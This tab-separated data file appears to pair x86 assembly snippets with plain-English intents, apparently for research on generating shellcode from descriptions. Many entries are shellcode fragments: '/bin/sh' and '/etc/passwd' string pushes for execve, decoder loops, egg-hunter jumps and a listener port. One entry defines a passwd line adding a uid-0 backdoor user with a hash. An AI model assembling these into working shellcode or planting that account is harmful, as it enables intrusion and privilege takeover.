SNIPPETS	INTENTS
push dword 0x6962732f	push the dword 0x6962732f onto the stack
push dword 0x6b2f7379	push the dword 0x6b2f7379 onto the stack
push dword 0x6b6e756a	push the dword 0x6b6e756a onto the stack
push dword 0x6d6f646e	push the dword 0x6d6f646e onto the stack
push dword 0x6e69622f	push the dword 0x6e69622f onto the stack
push dword 0x6e69922f	push the dword 0x6e69922f onto the stack
push dword 0x6f702f6e	push the dword 0x6f702f6e onto the stack
push dword 0x6f726577	push the dword 0x6f726577 onto the stack
push dword 0x7264632f	push the dword 0x7264632f onto the stack
push dword 0x72657355	push the dword 0x72657355 onto the stack
push dword 0x732f636f	push the dword 0x732f636f onto the stack
push dword 0x73656c62	push the doubleword 0x73656c62 to the stack
push dword 0x73656c62	push the dword 0x73656c62 onto the stack
push dword 0x7461632f	push the dword 0x7461632f onto the stack
push dword 0x74652f2f	push the dword 0x74652f2f onto the stack
push dword 0x74652f2f \n mov eax, esp	push double word 0x74652f2f onto the stack and point the eax register to the stack register
push dword 0x74652f2f \n mov ebp, esp	push double word 0x74652f2f onto the stack and point the ebp register to the stack register
push dword 0x74652f2f \n mov ebx, esp	push double word 0x74652f2f onto the stack and point the ebx register to the stack register
push dword 0x74652f2f \n mov ecx, esp	push double word 0x74652f2f onto the stack and point the ecx register to the stack register
push dword 0x74652f2f \n mov edx, esp	push double word 0x74652f2f onto the stack and point the edx register to the stack register
push dword 0x74652f2f \n mov esi, esp	push double word 0x74652f2f onto the stack and point the esi register to the stack register
push dword 0x7665642f	push the dword 0x7665642f onto the stack
push dword 0x776f6461	push the dword 0x776f6461 onto the stack
push dword 0x8140a8c0	push the doubleword 0x8140a8c0 to the stack
push dword eax	push the doubleword eax to the stack
push dword eax	push the dword eax onto the stack
push dword ebx	push the doubleword ebx to the stack
push dx	push dx onto the stack
push eax	preserve eax on the stack
push eax	push eax on the stack
push eax	push eax onto stack
push eax	push eax onto the stack
push eax	push eax to the stack
push eax	push eax value to the stack
push eax	push the contents of eax onto the stack
push eax	push the contents of eax register onto the stack
push eax	push the contents of the eax register onto the stack
push eax	push the value of register eax onto the stack
push eax \n mov ebx, esp	push the contents of the eax register onto the stack and point ebx to the stack register
push eax \n mov ecx, esp	push the contents of the eax register onto the stack and point ecx to the stack register
push eax \n mov edx, esp	push the contents of the eax register onto the stack and point edx to the stack register
push ebp	push ebp onto the stack
push ebp	push the contents of the ebp register onto the stack
push ebp	push the ebp onto the stack
push ebp	save old base pointer
push ebp	save the old base pointer value
push ebx	preserve ebx on the stack
push ebx	push ebx on the stack
push ebx	push ebx onto the stack
push ebx	push ebx to the stack
push ebx	push the contents of ebx onto the stack
push ebx	push the contents of ebx register onto the stack
push ebx	push the contents of the ebx register onto the stack
push ebx	push the ebx value to the stack
push ebx \n mov eax, esp	push the contents of the ebx register onto the stack and point eax to the stack register
push ebx \n mov ecx, esp	push the contents of the ebx register onto the stack and point ecx to the stack register
push ebx \n mov edx, esp	push the contents of the ebx register onto the stack and point edx to the stack register
push ecx	preserve ecx on the stack
push ecx	push ecx on the stack
push ecx	push ecx onto the stack
push ecx	push ecx to the stack
push ecx	push the contents of ecx register onto the stack
push ecx	push the contents of the ecx register onto the stack
push ecx	push the contents of the ecx register onto the stack.
push ecx	push the ecx onto the stack
push ecx	push the value of register ecx onto the stack
push edi	push edi onto the stack
push edi	push edi to the stack
push edi	push the contents of edi register onto the stack
push edi	push the contents of the edi register onto the stack
push edi	push the edi onto the stack
push edi \n mov eax, esp	push the contents of the edi register onto the stack and point eax to the stack register
push edi \n mov ebx, esp	push the contents of the edi register onto the stack and point ebx to the stack register
push edi \n mov ecx, esp	push the contents of the edi register onto the stack and point ecx to the stack register
push edi \n mov edx, esp	push the contents of the edi register onto the stack and point edx to the stack register
push edx	preserve edx on the stack
push edx	push edx on the stack
push edx	push edx onto the stack
push edx	push edx to the stack
push edx	push the contents of edx register onto the stack
push edx	push the contents of the edx register onto the stack
push edx	push the value of register edx onto the stack
push edx \n mov eax, esp	push the contents of the edx register onto the stack and point eax to the stack register
push edx \n mov ebx, esp	push the contents of the edx register onto the stack and point ebx to the stack register
push edx \n mov ecx, esp	push the contents of the edx register onto the stack and point ecx to the stack register
push esi	preserve esi on the stack
push esi	push esi on the stack
push esi	push esi onto the stack
push esi	push esi to the stack
push esi	push the contents of esi register onto the stack
push esi	push the contents of the esi register onto the stack
push esi	push the contents of the esi register onto the stack.
push esi	push the esi onto the stack
push esi \n mov eax, esp	push the contents of the esi register onto the stack and point eax to the stack register
push esi \n mov ebx, esp	push the contents of the esi register onto the stack and point ebx to the stack register
push esi \n mov ecx, esp	push the contents of the esi register onto the stack and point ecx to the stack register
push esi \n mov edx, esp	push the contents of the esi register onto the stack and point edx to the stack register
push esp	push esp onto the stack
push esp	push esp to the stack
push esp	push the contents of esp register onto the stack
push esp	push the contents of the esp register onto the stack
push esp	push the esp onto the stack
push len	push len onto the stack
push long 0x68732f2f \n push long 0x6e69622f \n mov eax, esp	move /bin/sh into the eax register
push long 0x68732f2f \n push long 0x6e69622f \n mov ebx, esp	move /bin/sh into the ebx register
push long 0x68732f2f \n push long 0x6e69622f \n mov ecx, esp	put /bin/sh into the ecx register
push long 0x68732f2f \n push long 0x6e69622f \n mov edx, esp	put /bin/sh into the edx register
push name	push name onto the stack
push offset printf_msg	push address of string print_msg
push ogin	push the contents in ogin onto the stack
push sock_reg	push sock_reg onto the stack
push sock_reg	push the sock_reg onto the stack
push sys_execve	push sys_execve onto the stack
push word [edx]	push the word [edx] onto the stack
push word [edx]	push the word [edx] to the stack
push word 0544o	push the word 0544o onto the stack
push word 0644o	push the word 0644o onto the stack
push word 0666q	push the word 0666q onto the stack
push word 0x02	push the word 0x02 onto the stack
push word 0x0a	push the word 0x0a onto the stack
push word 0x0a	push the word 0x0a to the stack
push word 0x0f27	push the word 0x0f27 onto the stack
push word 0x1b6	push the word 0x1b6 onto the stack
push word 0x1b6	push the word 0x1b6 to the stack
push word 0x1ff	push the word 0x1ff onto the stack
push word 0x2	push the word 0x2 onto the stack
push word 0x2	push the word 0x2 to the stack
push word 0x2923	push 0x2923 onto stack port
push word 0x2e2e	push the word 0x2e2e onto the stack
push word 0x3436	push the word 0x3436 onto the stack
push word 0x3582	push the word 0x3582 onto the stack
push word 0x3636	push the word 0x3636 onto the stack
push word 0x3905	push the word 0x3905 onto the stack
push word 0x3905	push the word 0x3905 to the stack
push word 0x3930	push the word 0x3930 onto the stack
push word 0x401f	push the word 0x401f onto the stack
push word 0x4255	push the word 0x4255 onto the stack
push word 0x462d	push the word 0x462d onto the stack
push word 0x462d	push the word 0x462d to the stack
push word 0x5000	push 0x5000 onto stack port
push word 0x5445	push the word 0x5445 onto the stack
push word 0x5974	push the word 0x5974 onto the stack
push word 0x5c11	push the word 0x5c11 onto the stack
push word 0x5c11	push the word 0x5c11 to the stack
push word 0x632d	push the word 0x632d onto the stack
push word 0x632d	push the word 0x632d to the stack
push word 0x632d \n mov eax, esp	push the word 0x632d onto the stack and point the eax register to the stack register
push word 0x632d \n mov ebx, esp	push the word 0x632d onto the stack and point the ebx register to the stack register
push word 0x632d \n mov ecx, esp	push the word 0x632d onto the stack and point the ecx register to the stack register
push word 0x632d \n mov edi, esp	push the word 0x632d onto the stack and point the edi register to the stack register
push word 0x632d \n mov edx, esp	push the word 0x632d onto the stack and point the edx register to the stack register
push word 0x632d \n mov esi, esp	push the word 0x632d onto the stack and point the esi register to the stack register
push word 0x6465	push the word 0x6465 onto the stack
push word 0x662d	push the word 0x662d onto the stack
push word 0x662d \n mov eax, esp	push the word 0x662d onto the stack and point the eax register to the stack register
push word 0x662d \n mov ebx, esp	push the word 0x662d onto the stack and point the ebx register to the stack register
push word 0x662d \n mov ecx, esp	push the word 0x662d onto the stack and point the ecx register to the stack register
push word 0x662d \n mov edi, esp	push the word 0x662d onto the stack and point the edi register to the stack register
push word 0x662d \n mov edx, esp	push the word 0x662d onto the stack and point the edx register to the stack register
push word 0x662d \n mov esi, esp	push the word 0x662d onto the stack and point the esi register to the stack register
push word 0x6666	push the word 0x6666 onto the stack
push word 0x6873	push the word 0x6873 onto the stack
push word 0x692d	push the word 0x692d onto the stack
push word 0x697a	push the word 0x697a onto the stack
push word 0x6d6f	push the word 0x6d6f onto the stack
push word 0x6f64	push the word 0x6f64 onto the stack
push word 0x6f64	push the word 0x6f64 to the stack
push word 0x7065	push the word 0x7065 onto the stack
push word 0x722d	push the word 0x722d onto the stack
push word 0x7365	push the word 0x7365 onto the stack
push word 0x736e	push the word 0x736e onto the stack
push word 0x776f	push the word 0x776f onto the stack
push word 0x7773	push the word 0x7773 onto the stack
push word 0x7773	push the word 0x7773 to the stack
push word 0x8223	push the word 0x8223 onto the stack
push word 0xaaaa	push the word 0xaaaa onto the stack
push word 0xb315	push the word 0xb315 onto the stack
push word 0xc005	push the word 0xc005 onto the stack
push word 0xc005	push the word 0xc005 to the stack
push word 0xffff	push the word 0xffff onto the stack
push word 0xffff	push the word 0xffff to the stack
push word 1 \n mov eax, esp	push the word 1 onto the stack and point eax to the stack register
push word 10	push the word 10 to the stack
push word 100	push the word 100 onto the stack
push word 17 \n mov edx, esp	push the word 17 onto the stack and point edx to the stack register
push word 2	push 2 onto stack
push word 2	push the word 2 onto the stack
push word 2 \n mov ecx, esp	push the word 2 onto the stack and point ecx to the stack register
push word 21 \n mov ebx, esp	push the word 21 onto the stack and point ebx to the stack register
push word ax	push the word ax onto the stack
push word bx	push the word bx onto the stack
push word bx	push the word bx to the stack
push word cx	push the word cx onto the stack
push zero_reg	push the zero_reg onto the stack
push zero_reg	push zero_reg onto the stack
push_cmd:	declare push_cmd label
push_cmd:	declare the push_cmd label
pushl $0x68732f2f	push $0x68732f2f onto the stack
pushl $0x6e69622f	push $0x6e69622f onto the stack
pushw $0x632d	push $0x632d onto the stack
pushw 0x3905	push the 0x3905 onto the stack
pushw 0x682d	push the 0x682d onto the stack
pushw 0x697a	push the 0x697a onto the stack
re	define label re
read:	declare the read label
reading:	declare the reading label
real_number1 dd 1234	define the doubleword variable real_number1 and initialize to 1234
real_number2 dd 123456	define the doubleword variable real_number2 and initialize 123456
realarray resq 10	reserve an array of ten reals for realarray
realarray resq 10	reserve array realarray of 10 real numbers
ret	return
ret	return the address off the stack and returns control to that location
ret	return to caller
ret	return to our program
ret	return to the address on the top of the stack
ret	return to where the function was called
retry:	declare retry label
rol byte [esi], 0x1	left rotate the byte in esi 1 time
rol byte [esi], 0x2	left rotate the byte at the address esi by 0x2 bits
rol byte [esi], 0x2	left rotate the byte in esi 2 times
rol byte [esi], 4	rotate 4 bits left the byte starting at the address esi
rol edi, 1	left rotate the contents of the edi register by 1 bit
rol edi, 1	left rotate the edi register 1 time
rol edx, 0x4	left rotate the contents of the edx register by 0x4 bits
rol edx, 0x4	left rotate the edx register 4 times
ror byte [esi], 0x1	right rotate the byte in esi 1 time
ror esi, 1	right rotate esi 1 time
ror esi, 1	right rotate the contents of the esi register by 1 bit
rotate:	declare the rotate label
sar eax, 23	right shift the contents of eax by 23 bits
sar eax, 31	right shift the contents of eax by 31 bits
sar ebx, 31	right shift the contents of ebx by 31 bits
sar ecx, 2	right shift the value of register ecx by 2 bits
sar edx, 4	right shift the value of register edx by 4 bits
scasd	compare eax with doubleword at edi and set status flags
scasd	compare the contents of the eax register with doubleword at edi and set status flags
scasd	compare the value in eax to the doubleword addressed by edi
scasd	compare the value in the eax register to the doubleword addressed by the edi register
scasd \ jnz _end \n jmp edi	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _end	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz _end \n jmp edi	jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz _start	jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz _start \n jmp edi	jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n jnz IncAddr	jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n jnz IncAddr \n jmp edi	jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
scasd \n l1 IncAddr	jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi
scasd \n l1 IncAddr \n jmp edi	jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register
section .bss	declare bss section
section .bss	declare code section .bss
section .bss	declare section bss
section .bss	declare section containing uninitialized data
section .bss	declare the bss section
section .bss	section bss
section .data	declare data section
section .data	declare section .data
section .data	declare section containing initialized data
section .data	declare the data section
section .data	section data
section .data	section for initialized data
section .text	declare .text section
section .text	declare code section
section .text	declare section containing code
section .text	declare section text
section .text	declare text section
section .text	declare the text section
section .text	section .text
section .text	section text
set_argv:	declare the set_argv label
set_argv:	define set_argv label
set_mark:	declare the set_mark label
set_mark:	define set_mark label
setup:	declare the setup label
shell_ret:	declare the shell_ret label
shell:	declare the shell label
shellcode:	declare the shellcode label
shellcode:	define shellcode label
shellcode: db 'vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash'	define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash
shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23	define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23
shellcodelen equ $-shellcode	define shellcodelen equal to the length of shellcode
shellcodelen equ $-shellcode	define shellcodelen equal to the length shellcode
shift_decode:	declare the shift_decode label
shift_decode:	define shift_decode label
shl al, 4	left shift the contents of al by 4 bit positions
shl cx, 1	left shift cx
shl eax, 1	multiply eax by 2 using left shift
shl eax, 1	multiply the value of eax by 2
shl eax, 16	left shift the contents of eax 16 bits
shl eax, 2	multiply eax by 4 using left shift
shl eax, 28	left shift the contents of eax register by 28 bit positions
shl eax, 5	left shift the contents of eax by 5 bit positions
shl eax,2	left shift eax by two bits
shl ebx, 1	multiply ebx by 2 using left shift
shl ebx, 2	multiply ebx by 4 using left shift
shl ebx, 8	left shift the contents of ebx by 8 bits
shl ecx, 1	multiply ecx by 2 using left shift
shl ecx, 2	multiply ecx by 4 using left shift
shl edi, 0x1	left shift the contents of the edi register by 0x1 bit
shl edx, 1	multiply edx by 2 using left shift
shl edx, 2	multiply edx by 4 using left shift
shl edx, 24	left shift the contents of the edx register by 24 bits
shl edx, 9	left shift the contents of edx register by 9 bit positions
shl edx, 9	left shift the contents of the edx register by 9 bits
shl esi, 0x1	left shift the contents of the esi register by 0x1 bit
shr [var], 3	right shift by 3 bit positions the contents of var variable
shr ax, 1	right shift ax by 1 bit
shr ax, cl	right shift the contents of the edi register by the contents of the cl register
shr bl, 4	right shift the contents of bl register by 4 bit positions
shr bl,4	right shift by 4 bits bl
shr dl, 1	right shift the contents of the dl register by 1 bit
shr dl, 4	right shift the contents of dl register by 4 bit positions
shr dl,1	right shift the contents of dl register by 1 bit positions
shr eax, 1	divide eax by 2 using right shift
shr eax, 16	right shift the contents of eax register by 16 bit positions
shr eax, 2	divide eax by 4 using right shift
shr eax, 24	right shift the contents of the eax register by 24 bit positions
shr eax, 28	right shift the contents of eax register by 28 bit positions
shr ebx, 1	divide ebx by 2 using right shift
shr ebx, 2	divide ebx by 4 using right shift
shr ebx, cl	right shift the contents of the ebx register by the contents of the cl register
shr ecx, 1	divide ecx by 2 using right shift
shr ecx, 2	divide ecx by 4 using right shift
shr edx, 1	divide edx by 2 using right shift
shr edx, 16	right shift the contents of the edx register by 16
shr edx, 2	divide edx by 4 using right shift
shr edx, byte 16	right shift the contents of the edx register by the byte 16
shr edx, byte 24	right shift the contents of the edx register by the byte 24
size: equ 1024	define size to be 1024 bytes large
size: equ 50000	declare a constant size and set equal to 50000
stage:	declare the stage label
stage:	define stage label
stageaddress:	declare the stageaddress label
start:	declare the start label
stc	set carry flag
str db 'hello',0	declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte
str db 'hey',0	declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively
string db 'test.txt'	define string as the byte string 'test.txt'
string: db '/bin/sh'	define string as the byte string '/bin/sh'
string: db '/etc/passwd'	define string as the byte string '/etc/passwd'
string: db 'file.txt'	define string as the byte string 'file.txt'
string: db 'file1.txt'	define string as the byte string 'file1.txt'
string: db 'prova.txt'	define string as the byte string 'prova.txt'
string: db 'tmp.txt'	define string as the byte string 'tmp.txt'
sub [var], esi	subtract the contents of esi from the 32-bit integer stored at memory location var
sub [var2], esi	subtract the contents of esi from the 32-bit integer stored at memory location var2
sub al, 0x41	subtract 0x41 from the al register
sub al, 1 \n jns l1	subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative
sub al, 1 \n jnz l1	subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero
sub al, 88	subtract 88 from the contents of al register and save the result in al
sub al, 88	subtract 88 from the contents of the al register
sub al, ah	subtract ah from al
sub al,0x13	subtract 0x13 from the al register
sub ax, 13	subtract 13 from ax and save the result into ax
sub ax, 1564	subtract 1564 from ax and save the result into ax
sub ax, 1564	subtract 1564 from the contents of ax register and save the result in ax
sub ax, 1564	subtract 1564 from the contents of the ax register
sub ax, 1662	subtract 1662 from ax and save the result into ax
sub ax, 1662	subtract 1662 from the contents of ax register and save the result in ax
sub ax, 1662	subtract the contents of the ax register by 1662
sub ax, ax	subtract the contents of ax from the contents of ax
sub bl, 0x7	subtract 0x7 from bl and save the result into bl
sub bl, 0x7	subtract 0x7 from the contents in bl and save the result in bl
sub bl, 3	subtract 3 from the contents of the bl register
sub bl, 3 \n jnz stage	subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero
sub bl, 4 \n jns l2	subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative
sub bl, 48	subtract the decimal value 48 from the nl register
sub bl, al	subtract the contents of al register from the contents of bl register and save the result in bl
sub bl, byte [esi]	subtract 0x7 from the byte in esi register
sub bl, cl \n jnz l2	subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero
sub bl,byte [esi]	subtract the byte in esi from the bl register
sub bx, 1634	subtract 1634 from bx and save the result into bx
sub bx, 1634	subtract 1634 from the contents of bx register and save the result in bx
sub bx, 1634	subtract 1634 from the contents of the bx register
sub bx, 1663	subtract 1663 from bx and save the result into bx
sub bx, 1663	subtract 1663 from the contents of the bx register
sub bx, 1663	subtract the contents of bx register by 1663 and save the result in bx
sub bx, bx	subtract the contents of bx from the contents of bx
sub bx, dx	subtract the contents of the dx register from the contents of the bx register
sub byte [buff],20h	subtract 20h from the 8-bit at memory location buff
sub byte [ebp+ecx],20h	subtract 20h from the 8-bit at memory location ebp+ecx
sub byte [esi], 0xd	subtract 0xd from the byte at the address esi
sub byte [esi], 13	subtract 13 from the byte at the address esi
sub byte [esi], 13	subtract 13 from the byte in esi and save the result in esi
sub cl, 1	subtract 1 from the contents of the cl register
sub cl, 1 \n jnz decode	subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero
sub cl, bl \n jns l3	subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative
sub cl, dl	subtract the contents of dl register from the contents of cl register and save the result in cl
sub cx, 0x7ff	subtract 0x7ff from the contents in cx and save the result in cx
sub cx, 0x7ff	subtract 0x7ff from the contents of cx register value and save the result in cx
sub cx, cx	subtract the contents of cx from the contents of cx
sub dl, 5 \n jns l4	subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative
sub dl, al	subtract the contents of al register from the contents of dl register and save the result in dl
sub dl, al \n jns decode_pr	subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative
sub dl, byte [esi]	subtract the byte at the address esi from the contents of the dl register
sub dx, 15444	subtract 15444 from dx and save the result into dx
sub dx, 15444	subtract 15444 from the contents of the dx register
sub dx, bx	subtract the contents of bx from the contents of dx
sub eax, [esp]	subtract the value of the memory at address esp from eax and store into eax
sub eax, 0x013ffeff	subtract 0x013ffeff from the contents in eax and save the result in eax
sub eax, 0x04feca01	subtract 0x04feca01 from the contents in eax and save the result in eax
sub eax, 0x0efc3532	subtract 0x0efc3532 from the contents in eax and save the result in eax
sub eax, 0x10	subtract 0x10 from eax
sub eax, 0x2c3d2dff	subtract 0x2c3d2dff from the contents in eax and save the result in eax
sub eax, 0x3217d6d2	subtract 0x3217d6d2 from the contents in eax and save the result in eax
sub eax, 0x3bd04ede	subtract 0x3bd04ede from the contents in eax and save the result in eax
sub eax, 0x70445eaf	subtract 0x70445eaf from the contents in eax and save the result in eax
sub eax, 216	subtract 216 from the value stored in eax
sub eax, 3	decrease eax by 3
sub eax, 3e716230	subtract 3e716230 from the contents of the eax register
sub eax, 5d455523	subtract 5d455523 from the contents of the eax register
sub eax, 5e5d7722	subtract 5e5d7722 from the contents of the eax register
sub eax, 8	subtract 8 from the contents of eax register and save the result in eax
sub eax, 8	subtract 8 from the contents of the eax register
sub eax, eax	subtract the contents of eax from the contents of eax
sub eax, ebx	subtract ebx from eax
sub eax, ebx	subtract the address in ebx from the address in eax
sub eax,20000h	subtract 20000h from eax register
sub ebx, 0x2e2aa163	subtract 0x2e2aa163 from ebx and save the result into ebx
sub ebx, 0x2e2aa163	subtract 0x2e2aa163 from the contents in ebx and save the result in ebx
sub ebx, 2	decrease ebx by 2
sub ebx, byte 3	subtract the byte 3 from the contents of the ebx register
sub ebx, byte 3	subtract the byte value 3 from the contents of ebx and save the result in ebx
sub ebx, byte 8	subtract the byte 8 from the contents of the ebx register
sub ebx, byte 8	subtract the byte value 8 from the contents of ebx and save the result in ebx
sub ecx, 0x04baca01	subtract 0x04baca01 from the contents in ecx and save the result in ecx
sub ecx, 0x0b454440	subtract 0x0b454440 from the contents in ecx and save the result in ecx
sub ecx, 0x1525152a	subtract 0x1525152a from the contents in ecx and save the result in ecx
sub ecx, 0x6374612e	subtract 0x6374612e from the contents in ecx and save the result in ecx
sub ecx, 1	decrease ecx by 1
sub ecx, 23	subtract 23 from the contents of the ecx register
sub ecx, ecx	subtract ecx from ecx and save the result into ecx
sub ecx, ecx	subtract the contents of ecx from the contents of ecx
sub ecx, ecx	subtract the contents of the ecx register from the contents of the ecx register
sub edi, 0x44444444	subtract 0x44444444 from edi and save the result in edi
sub edi, 0xffffffdf	subtract 0xffffffdf from edi
sub edi, 1768009314	subtract 1768009314 from the contents of the edi register
sub edi, 1768009314	subtract 1768009314 from the edi register and save the result in edi
sub edx, 4	decrease edx by 4
sub edx, edx	subtract the contents of the edx register from the contents of the edx register
sub esp, 0x24	subtract 0x24 from the contents in esp and save the result in esp
sub esp, 0x28	subtract the value 0x28 from the esp register
sub esp, 12	subtract 12 from esp register and save the result in esp
sub esp, 12	subtract 12 from the contents of the esp register
sub esp, 4	allocate memory for a variable
sub esp, 4	allocate memory for local variables
sub esp, 4	allocate memory for variable
sub esp, 4	allocate space on the stack for local variable
sub esp, 4	make room for one 4-byte local variable
sub esp, 4	make room on the stack for local variable
sub esp, 4	make space on stack
sub esp, 4	subtract the value 4 from the esp register and save the result in esp
sub esp, 8	subtract 8 from esp and save the result in esp
sub esp, byte 0x1	subtract the byte 0x1 from the contents of the esp register
sub esp, byte 0x1	subtract the byte value 0x1 from esp register and save the result in esp
sys_execve equ 0x0b	define sys_execve equal to 0x0b
syscall_execve equ 11	define syscall_execve equal to 11
test al, al	test the value of the al register
test al, al \n jz found \n inc ecx	jump to the label found if the contents of the al register is zero else increment the contents of the ecx register
test al, al \n jz found \n inc ecx	if the contents of the al register is zero then jump to the label found else increment the contents of the ecx register
test ax, ax	perform a bitwise and of the contents of ax and the contents of ax
test ax, ax \n jnz exeunt \n jmp carryon	jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon
test ax, ax \n jnz exeunt \n jmp carryon	if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon
test bl, bl \n jz not_found	jump to the label not_found if the contents of the bl register is not zero
test bl, bl \n jz not_found	if the contents of the bl register is not zero then jump to the label not_found
test cl, cl	test the value of cl
test dl, 0x1 \n jnz ready_to_proxy	jump to the label ready_to_proxy if the contents of the dl register is not zero
test dl, 0x1 \n jnz ready_to_proxy	if the contents of the dl register is not zero then jump to the label ready_to_proxy
test eax, eax	perform a bitwise and on the contents of the eax register
test eax, eax	test the value of eax
test eax, eax \n jnz _convert	jump to the label _convert if the contents of the eax register is not zero
test eax, eax \n jnz _convert	if the contents of the eax register is not zero then jump to the label _convert
test eax, eax \n jnz _parent \n pop ecx	jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register
test eax, eax \n jnz _parent \n pop ecx	if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register
test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6	jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register
test eax, eax \n jnz _recv_http_request \n sub ecx, 0x6	if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register
test eax, eax \n jnz checkforfile	jump to the label checkforfile if the contents of the eax register is not zero
test eax, eax \n jnz checkforfile	if the contents of the eax register is not zero then jump to the label checkforfile
test eax, eax \n jnz do_next_accept	jump to the label do_next_accept if the contents of the eax register is not zero
test eax, eax \n jnz do_next_accept	if the contents of the eax register is not zero then jump to the label do_next_accept
test eax, eax \n jnz exit_on_error	jump to the label exit_on_error if the contents of the eax register is not zero
test eax, eax \n jnz exit_on_error	if the contents of the eax register is not zero then jump to the label exit_on_error
test eax, eax \n jnz l1	jump to the label l1 if the contents of the eax register is not zero
test eax, eax \n jnz l1	if the contents of the eax register is not zero then jump to the label l1
test eax, eax \n jnz l1 \n call myfunct	jump to the label l1 if the contents of the eax register is not zero else call the function myfunct
test eax, eax \n jnz l1 \n call myfunct	if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct
test eax, eax \n jnz l4 \n call search	jump to the label l4 if the contents of the eax register is not zero else call the function search
test eax, eax \n jnz l4 \n call search	if the contents of the eax register is not zero then jump to the label l4 else call the function search
test eax, eax \n jnz short _parent	jump short to the label _parent if the contents of the eax register is not zero
test eax, eax \n jnz short _parent	if the contents of the eax register is not zero then jump short to the label _parent
test eax, eax \n js _while_loop	jump to the label _while_loop if the contents of the eax register is negative
test eax, eax \n js _while_loop	if the contents of the eax register is negative then jump to the label _while_loop
test eax, eax \n js close	jump to the label close if the contents of the eax register is negative
test eax, eax \n js close	if the contents of the eax register is negative then jump to the label close
test eax, eax \n js old_dirent	jump to the label old_dirent if the contents of the eax register is negative
test eax, eax \n js old_dirent	if the contents of the eax register is negative then jump to the label old_dirent
test eax, eax \n js short socket	jump short to the label socket if the contents of the eax register is negative
test eax, eax \n js short socket	if the contents of the eax register is negative then jump short to the label socket
test eax, eax \n jz check_html	jump to the label check_html if the contents of the eax register is zero
test eax, eax \n jz check_html	if the contents of the eax register is zero then jump to the label check_html
test eax, eax \n jz check_html \n jmp while	jump to the label check_html if the contents of the eax register is zero else jump to the while label
test eax, eax \n jz check_html \n jmp while	if the contents of the eax register is zero then jump to the label check_html else jump to the while label
